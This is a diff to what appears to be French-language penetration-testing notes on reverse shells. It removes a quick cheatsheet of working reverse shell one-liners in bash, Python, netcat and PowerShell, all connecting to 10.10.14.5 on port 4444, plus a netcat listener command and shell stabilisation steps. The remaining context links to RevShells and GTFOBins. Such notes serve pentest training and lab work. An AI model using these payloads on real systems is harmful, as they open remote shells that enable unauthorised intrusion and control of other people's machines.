@@ -610,34 +610,6 @@ ps auxf | grep -E 'bash|sh' | grep -v grep
 
 ---
 
-## 🔟 Cheatsheet Rapide
-
-```bash
-# Listener
-nc -lvnp 4444
-
-# Bash
-bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
-
-# Python3
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
-
-# Netcat
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
-
-# PowerShell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-# Stabilisation
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Ctrl+Z
-stty raw -echo; fg
-reset
-export SHELL=bash TERM=xterm-256color
-```
-
----
-
 ## 📚 Ressources
 
 - **RevShells.com** : https://www.revshells.com/
@@ -647,5 +619,3 @@ export SHELL=bash TERM=xterm-256color
 - **GTFOBins** : https://gtfobins.github.io/
 
 ---
-
-**Tags:** `#reverse-shell #netcat #bash #python #powershell #stabilization #post-exploitation`
